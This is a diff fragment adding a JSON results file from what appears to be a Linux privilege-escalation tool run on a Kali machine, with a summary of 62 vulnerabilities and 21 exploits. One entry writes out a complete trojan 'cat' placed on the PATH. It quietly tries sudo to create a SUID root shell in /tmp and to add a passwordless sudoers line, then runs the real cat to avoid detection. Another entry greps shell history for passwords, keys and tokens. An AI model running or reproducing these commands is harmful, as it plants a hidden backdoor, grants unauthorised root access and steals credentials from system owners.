+            },
+            "command": "echo '#!/bin/bash\n    # Path hijacking exploit for cat\n    # Created by Advanced Linux Privilege Escalation Tool\n\n    # Try to use sudo to create a SUID binary\n    echo '#!/bin/bash\n    if [ $(id -u) -eq 0 ]; then\n        cp /bin/bash /tmp/.rootshell-1742117624\n        chmod 4755 /tmp/.rootshell-1742117624\n        echo \"Root shell created at /tmp/.rootshell-1742117624\"\n    fi' > /tmp/.sudoscript-1742117624\n    chmod +x /tmp/.sudoscript-1742117624\n\n    # Try various privilege escalation techniques silently\n    sudo /tmp/.sudoscript-1742117624 2>/dev/null || true\n    sudo -n /tmp/.sudoscript-1742117624 2>/dev/null || true\n\n    # Try to modify sudoers file\n    echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" | sudo tee -a /etc/sudoers 2>/dev/null || true\n\n    # Leave evidence of execution attempt\n    echo \"[+] Sudo exploitation attempt via cat path hijacking at $(date)\" > /tmp/.privesc-sudo-1742117624\n\n    # Run the original command to avoid detection\n    cat \"$@\"\n    ' > /home/kali/.local/bin/cat && chmod +x /home/kali/.local/bin/cat",
+            "description": "Create a malicious cat that tries various sudo techniques to gain root access",
+            "usage": "After a privileged user runs this command, check /tmp/ for .rootshell-* files or try 'sudo -l'",
+            "evidence_file": "/tmp/.privesc-sudo-1742117624"
+        },
+        {
+            "type": "history_file_exposure",
+            "vulnerability": {
+                "type": "history_file_exposure",
+                "path": "/home/kali/.bash_history",
+                "pattern": "(?i)passwd",
+                "matches": [
+                    "passwd"
+                ],
+                "is_exploitable": true
+            },
+            "command": "cat /home/kali/.bash_history | grep -E '(password|ssh|key|token)'",
+            "description": "Extract sensitive information from history file /home/kali/.bash_history"
+        }
+    ],
+    "summary": {
+        "total_vulnerabilities": 62,
+        "total_exploits": 21,
+        "vulnerability_types": {
+            "suid_binary": 36,
+            "sgid_binary": 11,
+            "world_writable_directory": 1,
+            "plaintext_credentials": 10,
+            "writable_path_directory": 1,
+            "path_hijacking": 2,
+            "history_file_exposure": 1
+        },
+        "exploit_types": {
+            "suid_binary": 1,
+            "path_hijacking": 3,
+            "plaintext_credentials": 10,
+            "path_hijacking_bash_copy": 2,
+            "path_hijacking_add_user": 2,
+            "path_hijacking_sudo_exploit": 2,
+            "history_file_exposure": 1
+        }
+    }
+}
